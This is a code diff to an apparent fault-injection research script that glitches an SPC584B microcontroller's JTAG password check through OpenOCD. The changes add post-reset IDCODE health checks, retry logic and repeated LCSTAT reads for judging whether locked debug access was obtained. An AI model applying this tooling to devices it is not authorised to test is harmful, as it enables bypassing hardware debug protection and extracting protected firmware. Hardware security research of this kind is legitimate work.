@@ -39,6 +39,7 @@ from findus.pyboard import PyboardError
 
 
 EXPECTED_IDCODE = 0x20144041
+IDCODE_INSTRUCTION = 0x01
 PASS_LCSTAT = 0xF7FF4000
 PASSWORD_BYTES = 32
 PASSWORD_INSTRUCTION = 0x07
@@ -70,7 +71,7 @@ class Result:
 
     @property
     def access_observed(self) -> bool:
-        return self.state in ("ACCESS_JUN_SET", "ACCESS_JUN_CLEAR")
+        return self.state.startswith("ACCESS_")
 
 
 class OpenOCDSession:
@@ -298,6 +299,16 @@ def password_scan_command(words: tuple[int, ...]) -> str:
     return f"drscan spc584b.tap {fields}"
 
 
+def read_idcode(session: OpenOCDSession) -> int:
+    """Read the always-available TAP IDCODE without probing locked CPU debug."""
+    session.command(f"irscan spc584b.tap 0x{IDCODE_INSTRUCTION:02x}")
+    response = session.command("drscan spc584b.tap 32 0x00000000").strip()
+    match = re.fullmatch(r"(?:0x)?([0-9a-fA-F]{1,8})", response)
+    if match is None:
+        raise ExperimentError(f"could not parse JTAG IDCODE response: {response!r}")
+    return int(match.group(1), 16)
+
+
 def reset_target(session: OpenOCDSession, hold_ms: int) -> None:
     if session.halted:
         session.command("resume")
@@ -312,6 +323,25 @@ def reset_target(session: OpenOCDSession, hold_ms: int) -> None:
     session.command("drscan spc584b.tap 32 0x00000000")
     session.halted = False
     session.preserve_halt = False
+
+
+def reset_and_verify_target(
+    session: OpenOCDSession, hold_ms: int, retries: int
+) -> None:
+    """Re-arm password security and prove the external FTDI still sees the TAP."""
+    observed: list[str] = []
+    for _ in range(retries + 1):
+        try:
+            reset_target(session, hold_ms)
+            idcode = read_idcode(session)
+            observed.append(f"0x{idcode:08x}")
+            if idcode == EXPECTED_IDCODE:
+                return
+        except ExperimentError as error:
+            observed.append(compact_error(error))
+    raise ExperimentError(
+        "target failed post-reset IDCODE health gate: " + ",".join(observed)
+    )
 
 
 def select_password_register(session: OpenOCDSession) -> None:
@@ -344,14 +374,30 @@ def probe_debug(session: OpenOCDSession, halt_timeout_ms: int) -> Result:
     try:
         registers = session.command("get_reg -force {pc msr r0}")
         target_state = session.command("spc584b.cpu curstate")
-        lcstat = session.read_word(PASS_LCSTAT)
     except ExperimentError as error:
-        return Result("ACCESS_UNVERIFIED", compact_error(error))
+        return Result("ORACLE_ERROR", compact_error(error))
 
+    try:
+        lcstats = tuple(session.read_word(PASS_LCSTAT) for _ in range(3))
+    except ExperimentError as error:
+        return Result(
+            "ACCESS_LCSTAT_UNREADABLE",
+            f"registers={registers};state={target_state};lcstat_error={compact_error(error)}",
+        )
+
+    lcstat = lcstats[0]
+    stable = len(set(lcstats)) == 1
+    valid = lcstat not in (0x00000000, 0xFFFFFFFF)
     jun = 1 if lcstat & (1 << 30) else 0
+    samples = ",".join(f"0x{value:08x}" for value in lcstats)
     detail = (
-        f"registers={registers};state={target_state};jun={jun};lc={lcstat & 0x7}"
+        f"registers={registers};state={target_state};lcstats={samples};"
+        f"stable={int(stable)};valid={int(valid)};jun={jun};lc={lcstat & 0x7}"
     )
+    if not stable:
+        return Result("ACCESS_LCSTAT_UNSTABLE", detail)
+    if not valid:
+        return Result("ACCESS_LCSTAT_INVALID", detail)
     state = "ACCESS_JUN_SET" if jun else "ACCESS_JUN_CLEAR"
     return Result(state, detail)
 
@@ -361,7 +407,7 @@ def submit_without_glitch(
     words: tuple[int, ...],
     args: argparse.Namespace,
 ) -> Result:
-    reset_target(session, args.reset_hold_ms)
+    reset_and_verify_target(session, args.reset_hold_ms, args.health_retries)
     select_password_register(session)
     session.command(
         password_scan_command(words),
@@ -399,7 +445,7 @@ def run_glitched_submission(
     point: Point,
     args: argparse.Namespace,
 ) -> Result:
-    reset_target(session, args.reset_hold_ms)
+    reset_and_verify_target(session, args.reset_hold_ms, args.health_retries)
     select_password_register(session)
 
     glitcher.edge_count_trigger(
@@ -441,7 +487,7 @@ def emit_edge_marker(
     args: argparse.Namespace,
 ) -> bool:
     """Emit a scope marker; GLITCH must be disconnected from the target rail."""
-    reset_target(session, args.reset_hold_ms)
+    reset_and_verify_target(session, args.reset_hold_ms, args.health_retries)
     select_password_register(session)
     glitcher.edge_count_trigger(
         pin_trigger=args.trigger_input,
@@ -553,6 +599,12 @@ def parse_args() -> argparse.Namespace:
     )
     parser.add_argument("--adapter-speed-khz", type=int, default=1000)
     parser.add_argument("--reset-hold-ms", type=int, default=50)
+    parser.add_argument(
+        "--health-retries",
+        type=int,
+        default=3,
+        help="post-reset IDCODE recovery retries before aborting (default: 3)",
+    )
     parser.add_argument("--halt-timeout-ms", type=int, default=100)
     parser.add_argument("--control-halt-timeout-ms", type=int, default=2000)
     parser.add_argument("--block-timeout", type=float, default=2.0)
@@ -594,6 +646,8 @@ def validate_args(args: argparse.Namespace) -> None:
         raise ExperimentError("--adapter-speed-khz must be positive")
     if args.reset_hold_ms < 0:
         raise ExperimentError("--reset-hold-ms cannot be negative")
+    if args.health_retries < 0:
+        raise ExperimentError("--health-retries cannot be negative")
     if args.halt_timeout_ms <= 0 or args.control_halt_timeout_ms <= 0:
         raise ExperimentError("halt timeouts must be positive")
     if args.block_timeout <= 0:
@@ -643,6 +697,10 @@ def main() -> int:
         print(f"MODE={args.mode}", flush=True)
         print("PASSWORD_SCAN=UNINTERRUPTED_256_BIT_DRSCAN", flush=True)
         print("TRIGGER_REFERENCE=TCK_EDGES_AFTER_PASSWORD_IR_SELECTION", flush=True)
+        print("JTAG_CONTROLLER=EXTERNAL_FTDI_PERSISTENT_OPENOCD", flush=True)
+        print("TARGET_REARM=DCI_DESTRUCTIVE_RESET_POWER_CYCLE_EQUIVALENT", flush=True)
+        print("PRE_SHOT_GATE=EXPECTED_IDCODE", flush=True)
+        print("POST_SHOT_ORACLE=HALT_REGISTERS_LCSTAT_X3", flush=True)
         print(f"PICO_PIO_TICK_NS={tick_ns}", flush=True)
 
         session = OpenOCDSession(openocd, args.adapter_speed_khz).__enter__()
